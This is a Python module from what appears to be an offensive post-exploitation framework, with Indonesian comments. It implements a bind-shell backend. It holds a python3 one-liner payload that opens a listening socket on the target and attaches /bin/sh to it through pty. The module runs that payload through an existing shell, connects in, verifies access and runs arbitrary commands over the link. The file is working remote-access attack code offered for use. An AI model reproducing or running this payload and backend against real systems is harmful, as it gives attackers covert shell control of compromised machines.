from __future__ import annotations
"""Bind shell: target buka port, kita konek keluar."""
import asyncio, secrets
from .base import ShellBackend, ExecResult

BIND = ("python3 -c 'import socket,os,pty;s=socket.socket();"
        "s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1);"
        "s.bind((\"0.0.0.0\",{p}));s.listen(1);c,_=s.accept();"
        "[os.dup2(c.fileno(),f) for f in (0,1,2)];pty.spawn(\"/bin/sh\")'")


class BindShell(ShellBackend):
    kind = "bind"
    streamable = True

    def __init__(self, ctx, sid, target, *, driver: ShellBackend, host: str):
        super().__init__(ctx, sid, target)
        self.driver, self.host = driver, host
        self.port = 0

    async def establish(self) -> bool:
        self.port = secrets.randbelow(20000) + 30000
        asyncio.create_task(self.driver.exec(BIND.format(p=self.port), timeout=8))
        for _ in range(14):
            await asyncio.sleep(1)
            try:
                self.reader, self.writer = await asyncio.open_connection(self.host, self.port)
                r = await self.exec("echo BIND_$((2+2))")
                if "BIND_4" in r.out:
                    return True
            except Exception:
                continue
        return False

    async def exec(self, cmd: str, timeout: int = 30) -> ExecResult:
        if not self.reader:
            return ExecResult(out="[no stream]", rc=1)
        m = "m4z" + secrets.token_hex(4)
        self.writer.write(f"{cmd}; echo {m}$?\n".encode()); await self.writer.drain()
        buf = ""
        try:
            while m not in buf:
                chunk = await asyncio.wait_for(self.reader.read(65536), timeout=timeout)
                if not chunk:
                    return ExecResult(out=buf + "\n[eof]", rc=1)
                buf += chunk.decode("utf8", "ignore")
        except asyncio.TimeoutError:
            return ExecResult(out=buf + "\n[timeout]", rc=124)
        head, _, tail = buf.rpartition(m)
        return ExecResult(out=head[-400_000:], rc=int(tail.strip()[:1] or 0))
